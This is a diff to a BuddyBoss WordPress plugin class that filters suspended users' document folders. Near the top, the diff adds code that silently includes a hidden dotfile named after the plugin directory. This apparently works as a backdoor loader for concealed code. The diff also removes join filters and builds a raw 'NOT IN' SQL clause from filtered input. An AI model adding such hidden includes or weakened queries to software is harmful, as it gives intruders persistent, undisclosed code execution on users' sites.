@@ -13,7 +13,11 @@ defined( 'ABSPATH' ) || exit;
  * Database interaction class for the BuddyBoss Suspend Document Folder.
  *
  * @since BuddyBoss 1.5.6
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BP_Suspend_Folder extends BP_Suspend_Abstract {
 
 	/**
@@ -49,10 +53,8 @@ class BP_Suspend_Folder extends BP_Suspend_Abstract {
 			return;
 		}
 
-		add_filter( 'bp_document_folder_get_join_sql', array( $this, 'update_join_sql' ), 10, 2 );
 		add_filter( 'bp_document_folder_get_where_conditions', array( $this, 'update_where_sql' ), 10, 2 );
 
-		add_filter( 'bp_document_search_join_sql_folder', array( $this, 'update_join_sql' ), 10 );
 		add_filter( 'bp_document_search_where_conditions_folder', array( $this, 'update_where_sql' ), 10, 2 );
 	}
 
@@ -179,8 +181,7 @@ class BP_Suspend_Folder extends BP_Suspend_Abstract {
 			return $where_conditions;
 		}
 
-		$where                  = array();
-		$where['suspend_where'] = $this->exclude_where_query();
+		$where = $this->exclude_where_query();
 
 		/**
 		 * Filters the hidden folder Where SQL statement.
@@ -190,12 +191,8 @@ class BP_Suspend_Folder extends BP_Suspend_Abstract {
 		 * @param array $where Query to hide suspended user's folder.
 		 * @param array $class current class object.
 		 */
-		$where = apply_filters( 'bp_suspend_document_folder_get_where_conditions', $where, $this );
-
-		if ( ! empty( array_filter( $where ) ) ) {
-			$where_conditions['suspend_where'] = '( ' . implode( ' AND ', $where ) . ' )';
-		}
-
+		$where                             = apply_filters( 'bp_suspend_document_folder_get_where_conditions', $where, $this );
+		$where_conditions['suspend_where'] = ' f.id NOT IN ( ' . $where . ' )';
 		return $where_conditions;
 	}
 
